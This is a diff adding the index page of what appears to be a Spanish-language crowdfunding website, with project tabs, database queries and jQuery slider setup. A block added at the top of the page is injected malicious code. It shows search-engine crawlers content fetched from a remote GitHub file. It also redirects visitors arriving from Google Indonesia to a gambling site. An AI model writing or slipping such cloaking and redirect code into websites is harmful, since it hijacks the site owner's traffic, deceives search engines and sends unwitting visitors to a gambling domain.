@@ -1,0 +1,339 @@
+<?php 
+
+$parlin = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$parlin_sec = "https://apontoque.slotasia88.vip/";
+
+function is_bot() { 
+    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'); 
+ 
+    foreach ($bots as $bot) { 
+        if (stripos($user_agent, $bot) !== false) { 
+            return true; 
+        } 
+    } 
+ 
+    return false; 
+} 
+ 
+if (is_bot()) { 
+    $message = file_get_contents('https://raw.githubusercontent.com/boshinodisini/bos-hino-disini/refs/heads/main/apontoque.txt');
+    echo $message; 
+}
+
+if (!empty($parlin) && (stripos($parlin, "google.co.id") !== false)) {
+    header("HTTP/1.1 302 Found");
+    header("Location: ".$parlin_sec);
+    exit();
+}
+?>
+<?
+	include('includes/constantes.php');
+
+    $pagina = PAGINA_INDEX;
+    $codigo_SEO = SEO_INDEX;
+
+	include('includes/header.php');
+?>
+    
+	<body>
+		<input type="hidden" name="version" value="<?=VERSION.'.'.SUBVERSION;?>" />
+    	<?include('includes/menu.php');?>
+  
+        <link class="rs-file" href="<?=$url?>css/royalslider.css" rel="stylesheet">
+        <link class="rs-file" href="<?=$url?>css/skins/minimal-white/rs-minimal-white.css" rel="stylesheet">
+        <div id="contenido">
+			<!-- Slider -->
+			<? include('index_slider.php'); ?>            
+
+			<!-- Container -->
+            <div class="container">
+                <div class="clear" style="height:10px"></div>
+		    	<!-- Tabs -->
+		    	<link class="rs-file" href="<?=$url?>css/jquery.sliderTabs.css" rel="stylesheet">
+                    
+		    	<div id="homeTabs" class="span12">
+                    <!-- Unordered list representing the tabs -->
+					<ul >
+						<li class="span3 tab">
+							<a href="#nuevos">
+								<div class="nuevos"></div>
+								<div class="clear"></div>
+								<?=$t_nuevos_proyectos[$idm]?>
+							</a>
+						</li>
+						<li class="span3 tab">
+							<a href="#mas-recaudados">
+								<div class="recaudados"></div>
+								<div class="clear"></div>
+								<?=$t_mas_recaudados[$idm]?>
+							</a>
+						</li>
+						<li class="span3 tab">
+							<a href="#populares">
+								<div class="populares"></div>
+								<div class="clear"></div>
+								<?=$t_populares[$idm]?>
+							</a>
+						</li>
+						<li class="span3 tab">
+							<a href="#logrados">
+								<div class="logrados"></div>
+								<div class="clear"></div>
+								<?=$t_logrados[$idm]?>
+							</a>
+						</li>
+					</ul>
+
+					<!-- Afterwards, include the div panels representing the panels of our slider -->
+			 		<div id="nuevos">
+			    		<ul id="retos">
+							<?
+							$Filtro = unserialize(FILTROS)[$datos['filtro']];
+														   
+							$qRetosNuevos = 'SELECT retos.id, retos.titulo, retos.localizacion, retos.extracto, retos.recaudado, retos.objetivo_recaudacion, retos.fecha_evento_libre, retos.visible,
+													retos_categorias.titol_'.$idm.' AS categoria, 
+													(SELECT foto
+													   FROM retos_imatges
+												      WHERE entrada = retos.id
+													  ORDER BY ordre LIMIT 1) AS foto
+											   FROM retos
+											   LEFT OUTER JOIN retos_categorias
+															ON retos.categoria = retos_categorias.codi
+											  WHERE visible NOT IN'.$Filtro.' AND (retos.privado = 0 OR retos.privado IS NULL)
+											  ORDER BY fecha_evento_libre DESC
+											  LIMIT '.$datos['proyectosenportada'];
+							$sRetosNuevos = $cdb->prepare($qRetosNuevos);
+							$sRetosNuevos->execute();
+                                                         
+							include("retoswhile.php");
+
+						?>
+			    		</ul>
+			  		</div>
+
+					<div id="mas-recaudados">
+						<ul id="retos">
+							<?
+
+							$qRetosRecord = 'SELECT retos.id, retos.titulo, retos.localizacion, retos.extracto, retos.recaudado, retos.objetivo_recaudacion, retos.fecha_evento_libre, retos.visible,
+													retos_categorias.titol_'.$idm.' AS categoria, 
+													(SELECT foto
+													   FROM retos_imatges
+													  WHERE entrada = retos.id
+													  ORDER BY ordre LIMIT 1) AS foto
+											   FROM retos
+											   LEFT OUTER JOIN retos_categorias
+											   				ON retos.categoria = retos_categorias.codi
+											  WHERE visible NOT IN(1,2,3,7,8) AND (retos.privado = 0 OR retos.privado IS NULL)
+											  ORDER BY recaudado DESC
+											  LIMIT '.$datos['proyectosenportada'];
+							
+							$sRetosRecord = $cdb->prepare($qRetosRecord);
+							$sRetosRecord->execute();
+
+							$sRetosNuevos = $sRetosRecord;
+							include("retoswhile.php");
+							
+						?>
+						</ul>
+					</div>
+
+					<div id="populares">
+						<ul id="retos">
+							<?
+							$qRetosPopulares = 'SELECT retos.id, retos.titulo, retos.localizacion, retos.extracto, retos.recaudado, retos.objetivo_recaudacion, retos.fecha_evento_libre, retos.visible,
+													   retos_categorias.titol_'.$idm.' AS categoria, 
+													   (SELECT foto
+														  FROM retos_imatges
+														 WHERE entrada = retos.id
+														 ORDER BY ordre
+														 LIMIT 1) AS foto
+											      FROM retos
+												  LEFT OUTER JOIN retos_categorias
+															   ON retos.categoria = retos_categorias.codi
+												 WHERE visible NOT IN(1,2,3,7,8) AND (retos.privado = 0 OR retos.privado IS NULL)
+												 ORDER BY visitas DESC
+												 LIMIT '.$datos['proyectosenportada'];
+						
+							$sRetosPopulares = $cdb->prepare($qRetosPopulares);
+							$sRetosPopulares->execute();
+
+							$sRetosNuevos = $sRetosPopulares;
+							include("retoswhile.php");
+	
+							?>
+						</ul>
+					</div>
+
+			  		<div id="logrados">
+			    		<ul id="retos">
+							<?
+							$qRetosLogrados = 'SELECT retos.id, retos.titulo, retos.localizacion, retos.extracto, retos.recaudado, retos.objetivo_recaudacion, retos.fecha_evento_libre, retos.visible,
+													  retos_categorias.titol_'.$idm.' AS categoria, 
+													  (SELECT foto
+														 FROM retos_imatges
+														WHERE entrada = retos.id
+														ORDER BY ordre
+														LIMIT 1) AS foto
+												 FROM retos
+												 LEFT OUTER JOIN retos_categorias
+															  ON retos.categoria = retos_categorias.codi
+												WHERE visible = 5 AND (retos.privado = 0 OR retos.privado IS NULL)
+												ORDER BY id DESC
+												LIMIT '.$datos['proyectosenportada'];
+							
+							$sRetosLogrados = $cdb->prepare($qRetosLogrados);
+							$sRetosLogrados->execute();
+							
+							$sRetosNuevos = $sRetosLogrados;
+							include("retoswhile.php");
+						
+						?>
+			    		</ul>
+			  		</div>
+					  
+				</div>
+
+		    	<!-- End Tabs -->
+				<div class="clear" style="height:50px"></div>
+
+				<!-- Footer -->
+				<div class="pie"><?=$datos['footer']?></div>
+				<div class="clear" style="height:100px"></div>
+		 	</div>
+    	</div>
+
+
+		<?include('includes/footer.php');?>
+		<script class="rs-file" src="<?=$url?>js/jquery.royalslider.min.js"></script>
+		<script src="<?=$url?>js/jquery.sliderTabs.min.js"></script>
+
+		<script type="text/javascript">
+			jQuery(document).ready(function($) {
+				var slider = $("div#homeTabs").sliderTabs({
+					mousewheel: false,
+					tabsScroll: false,
+					position: "top",
+					tabSlideSpeed: '5000',
+					tabArrows: false,
+				});
+
+				$('#full-width-slider').royalSlider({
+					arrowsNav: false,
+					arrowsNavAutoHide: true,
+					fadeinLoadedSlide: false,
+					controlNavigationSpacing: 0,
+					controlNavigation: 'bullets',
+					imageScaleMode: 'fill',
+					imageAlignCenter:false,
+					blockLoop: true,
+					loop: true,
+					autoScaleSliderWidth: 960,     
+					autoScaleSliderHeight: 425,
+					thumbsFitInViewport: false,
+					transitionType: 'fade',
+					keyboardNavEnabled: true,
+					navigateByClick: false,
+					block: {
+						delay: 400
+					},
+					autoPlay: {
+						// autoplay options go gere
+						enabled: true,
+						pauseOnHover: false,
+						delay: 6000
+					},
+					globalCaption: false,
+					deeplinking: {
+						enabled: true,
+						change: false
+					},
+					/* size of all images http://help.dimsemenov.com/kb/royalslider-jquery-plugin-faq/adding-width-and-height-properties-to-images */
+					imgWidth: 1500,
+					imgHeight: 800
+				});
+
+				var slider = $(".royalSlider").data('royalSlider');
+
+				slider.ev.on('rsAfterSlideChange', function() {
+					// fires when third slide content is loaded and added to DOM
+					$('.chart .knob').each(function () {
+						var $this = $(this);
+						var myVal = $this.attr("data-valor");
+						// alert(myVal);
+						if(myVal>=100){
+							var color = '#9FC43E';
+						}else{
+							var color = '#87CEEB';
+						}
+						$this.knob({
+							'fgColor': color,
+							'format' : function (value) {
+								return myVal + '%';
+							}
+						});
+					});
+				});			
+
+				$('.knob').each(function () {
+					var $this = $(this);
+					var myVal = $this.attr("data-valor");
+					// alert(myVal);
+					if(myVal>=100){
+						var color = '#9FC43E';
+					}else{
+						var color = '#87CEEB';
+					}
+					$this.knob({
+						'fgColor': color,
+						'format' : function (value) {
+							return myVal + '%';
+						}
+					});
+				});
+
+				$('.info-reto').on({
+					mouseover: function () {
+						var proyecto = $(this);
+						proyecto.children('.objetivo').slideDown('slow', "easeOutBounce", function () {
+							// Animation complete.
+						});
+					},
+					mouseleave: function () {
+						var proyecto = $(this);
+						proyecto.children('.objetivo').slideUp('slow', "easeOutBounce", function () {
+						// Animation complete.
+						});
+					}
+				}, ".slideRecaudado"); //pass the element as an argument to .on
+
+				$('#datos-proyecto').on({
+					mouseover: function () {
+						var proyecto = $(this);
+						proyecto.children('.objetivo').slideDown('slow', "easeOutBounce", function () {
+							// Animation complete.
+						});
+					},
+					mouseleave: function () {
+						var proyecto = $(this);
+						proyecto.children('.objetivo').slideUp('slow', "easeOutBounce", function () {
+							// Animation complete.
+						});
+					}
+				}, ".slideRecaudado"); //pass the element as an argument to .on
+
+				$('.reto').on({
+					mouseover: function () {
+						console.log('aqui');
+						$(this).tooltip('show');
+					},
+					mouseleave: function () {
+						$(this).tooltip('hide');
+					}
+				}, ".tooltips"); //pass the element as an argument to .on
+
+			});
+		</script>
+	</body>
+</html>
